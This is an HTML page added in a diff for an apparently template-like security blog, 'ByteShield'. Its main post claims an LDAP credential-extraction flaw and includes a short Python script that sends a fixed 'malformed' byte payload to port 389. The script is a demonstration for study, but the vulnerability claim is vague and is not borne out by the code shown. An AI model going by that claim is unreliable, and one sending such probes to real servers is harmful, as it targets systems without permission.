@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ByteShield - Cybersecurity Research</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="ascii-logo">
+                ______         __         ____   __    _          __     __
+               / ____/__  ____/ /__  ____/ __ \ / /_  (_)__  ____/ /____/ /
+              / /   / _ \/ __  / _ \/ __  / / // __ \/ / _ \/ __  / ___/ / 
+             / /___/  __/ /_/ /  __/ /_/ / /_// / / / /  __/ /_/ / /  / /  
+             \____/\___/\__,_/\___/\__, /\____/_/ /_/_/\___/\__,_/_/  /_/   
+                                  /____/                                   
+            </div>
+            <h1>ByteShield</h1>
+            <p>Exploring the Digital Frontier, One Vulnerability at a Time</p>
+            <nav>
+                <a href="html/index.html">HOME</a>
+                <a href="html/posts.html">POSTS</a>
+                <a href="html/projects.html">PROJECTS</a>
+                <a href="html/tools.html">TOOLS</a>
+                <a href="html/about.html">ABOUT</a>
+            </nav>
+        </header>
+
+        <main>
+            <article class="post">
+                <h2 class="post-title">Reverse Engineering Legacy Authentication Systems</h2>
+                <div class="post-meta">Posted on March 19, 2025 | By CyberExplorer</div>
+                <div class="post-content">
+                    <p>Today I'm diving into the fascinating world of legacy authentication systems and their vulnerabilities. These systems remain in use across many enterprise environments despite their known weaknesses.</p>
+                    
+                    <div class="divider">== [ THE JOURNEY BEGINS ] ==</div>
+                    
+                    <p>During my analysis of a legacy LDAP implementation, I discovered an interesting vulnerability that allows for credential extraction under specific conditions. Let's break down the process...</p>
+                    
+                    <pre><code>#!/usr/bin/python3
+# Simple demonstration of the vulnerability
+import socket
+
+def send_malformed_request(target_ip, target_port):
+    payload = b'\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00'
+    
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((target_ip, target_port))
+        s.sendall(payload)
+        response = s.recv(1024)
+        return response
+
+# Example usage
+# response = send_malformed_request('192.168.1.100', 389)
+# print(response)</code></pre>
+                    
+                    <p>The key insight here is that the malformed request triggers an error condition that wasn't properly handled in the authentication flow. This is a classic example of <a href="#">improper error handling</a> creating security vulnerabilities.</p>
+                    
+                    <div class="divider">~*~*~*~*~*~*~*~*~*~*~*~*~*~</div>
+                </div>
+                <div class="post-tags">
+                    <span class="tag">reverse-engineering</span>
+                    <span class="tag">authentication</span>
+                    <span class="tag">LDAP</span>
+                    <span class="tag">vulnerability</span>
+                </div>
+            </article>
+            
+            <article class="post">
+                <h2 class="post-title">Setting Up a Honeypot to Analyze Attack Patterns</h2>
+                <div class="post-meta">Posted on March 15, 2025 | By CyberExplorer</div>
+                <div class="post-content">
+                    <p>Honeypots are powerful tools for understanding attacker behavior. In this post, I'll share my experience setting up a medium-interaction honeypot to collect data on current attack patterns.</p>
+                    
+                    <div class="divider">== [ EQUIPMENT SETUP ] ==</div>
+                    
+                    <p>For this project, I used a Raspberry Pi running a customized version of HoneyDrive with some additional tools I've developed to enhance logging capabilities...</p>
+                    
+                    <p class="blink">[ Read More ]</p>
+                </div>
+                <div class="post-tags">
+                    <span class="tag">honeypot</span>
+                    <span class="tag">threat-intelligence</span>
+                    <span class="tag">raspberry-pi</span>
+                </div>
+            </article>
+        </main>
+
+        <aside class="sidebar">
+            <h3>About Me</h3>
+            <p>Security researcher, CTF enthusiast, and perpetual learner. Documenting my journey through the cybersecurity landscape.</p>
+            
+            <h3>Latest Projects</h3>
+            <ul>
+                <li><a href="#">PacketPhantom - Traffic Analysis Tool</a></li>
+                <li><a href="#">WebVulnScanner - Custom Web Vulnerability Scanner</a></li>
+                <li><a href="#">CryptoBreaker - Cryptography Learning Platform</a></li>
+            </ul>
+            
+            <h3>Useful Links</h3>
+            <ul>
+                <li><a href="https://github.com/yourusername" target="_blank">My GitHub</a></li>
+                <li><a href="https://twitter.com/yourusername" target="_blank">Twitter</a></li>
+                <li><a href="https://www.hackthebox.eu/profile/yourusername" target="_blank">HackTheBox Profile</a></li>
+            </ul>
+        </aside>
+
+        <footer>
+            <p>© 2025 ByteShield Cybersecurity Research | Made with <span style="color: var(--highlight);">♥</span> and lots of coffee</p>
+            <p class="blink">-- Security is a journey, not a destination --</p>
+            <div class="hit-counter">Visitors: 000472</div>
+        </footer>
+    </div>
+
+    <script src="js/script.js"></script>
+</body>
+</html>
